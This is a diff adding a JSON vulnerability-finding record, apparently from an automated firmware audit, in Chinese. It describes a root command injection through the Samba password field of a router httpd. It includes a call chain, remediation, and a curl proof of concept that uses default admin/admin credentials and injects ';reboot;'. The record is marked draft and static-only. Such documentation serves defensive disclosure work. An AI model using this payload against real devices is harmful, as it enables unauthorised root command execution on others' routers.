@@ -1,0 +1,33 @@
+{
+  "job_id": "3a1f3c822c22",
+  "title": "httpd NAS Samba 口令字段命令注入（smbpasswd -p 拼接未过滤请求值，root 任意命令执行）",
+  "severity": "critical",
+  "confidence": 0.7,
+  "vuln_class": "cmdi",
+  "cwe": "CWE-78",
+  "binary_md5": "9582aa23b0bc2de099b9997b09457d01",
+  "binary_path": "firmware/binwalk_extracted/firmware.extracted/100000/squashfs-root/usr/bin/httpd",
+  "reachability": "static-only",
+  "summary": "httpd NAS Samba 口令字段命令注入（CWE-78）：nas_admin_pwd/newpassword3 未过滤拼入 smbpasswd -p 命令，经 execFormatCmd→tp_systemEx 以 root 执行",
+  "evidence": [
+    "httpDispatcher(0x425d08) → sub_49D184(0x49d184) → swNasSetSrvUserList(0x4bbd1c) → nasSetSrvUserList(0x5436e4) → nasSambaSetUserList(0x5471d0) → execFormatCmd(0x5308cc) → tp_systemEx(0x52f1e8)",
+    "sub_49D184(0x49d184)：httpGetEnv(a1,\"nas_admin_pwd\") → strncpy(&s[68],pwd,0x10) → swNasSetSrvUserList(s)",
+    "nasSambaSetUserList(0x5471d0)：execFormatCmd(\"%s -p %s -a %s\",\"smbpasswd\",&a1[44*v5+6],用户名)——口令未过滤/未转义",
+    "execFormatCmd(0x5308cc)：vsprintf(s,format,arg)→tp_systemEx(s)",
+    "tp_systemEx(0x52f1e8)：fork()+execve(\"/bin/sh\",{\"sh\",\"-c\",s},0)，httpd 以 root 运行",
+    "web/userRpm/NasFolderSharingRpm.htm 证实表单字段 accountSave/accountType/nas_admin_name/nas_admin_pwd，字符校验仅前端 JS"
+  ],
+  "session_id": "s-mt4dtbug-e1c6",
+  "function_name": "nasSambaSetUserList",
+  "preconditions": "管理员会话（默认 admin/admin）；无需 USB 盘；载荷≤16 字节",
+  "exploit_sketch": "GET /userRpm/NasFolderSharingRpm.htm?accountSave=Save&accountType=1&nas_admin_name=poctest&nas_admin_pwd=%3Breboot%3B → 设备重启",
+  "remediation": "shell 元字符过滤/转义；execve 参数数组调用 smbpasswd；限制口令字符集；CSRF 校验",
+  "poc": "curl -s -b 'Authorization=Basic YWRtaW46YWRtaW4=' -H 'Host: 192.168.1.1' -H 'Referer: http://192.168.1.1/userRpm/NasFolderSharingRpm.htm' 'http://192.168.1.1/userRpm/NasFolderSharingRpm.htm?accountSave=Save&accountType=1&nas_admin_name=poctest&nas_admin_pwd=%3Breboot%3B'",
+  "call_chain": "httpDispatcher(0x425d08) → sub_49D184(0x49d184) → swNasSetSrvUserList(0x4bbd1c) → nasSetSrvUserList(0x5436e4) → nasSambaSetUserList(0x5471d0) → execFormatCmd(0x5308cc) → tp_systemEx(0x52f1e8)",
+  "function_addr": "0x5471d0",
+  "id": "F-mt4f1lvh-fb8a",
+  "status": "draft",
+  "owner": "token-admin",
+  "recorded_at": "2026-08-22T13:30:31Z",
+  "history": []
+}
